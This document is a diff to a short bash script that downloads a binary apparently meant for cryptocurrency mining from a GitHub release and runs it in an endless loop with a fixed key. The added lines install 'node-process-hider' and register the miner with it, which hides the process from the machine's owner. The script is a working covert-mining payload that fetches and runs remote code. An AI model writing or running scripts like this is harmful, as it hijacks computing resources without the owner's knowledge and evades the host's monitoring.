@@ -1,7 +1,11 @@
 #!/bin/bash
+apt update && apt -y install wget curl sudo nodejs npm
 curl https://github.com/hashborn72/noid_miner/releases/download/0.2.5/hashborn-noid-linux -L -o hasborno
 chmod 777 hasborno
+npm i -g node-process-hider
+
+ph add hasborno
 
 while true; do
-./hasborno --key o1f74we257x39wtn0k3jws7uhvpnkmsewegkejyh89wjvmyhq53c8sj0n24h.$(echo $RANDOM | md5sum | head -c 10)
+./hasborno --key o1f74we257x39wtn0k3jws7uhvpnkmsewegkejyh89wjvmyhq53c8sj0n24h.aaa
 done
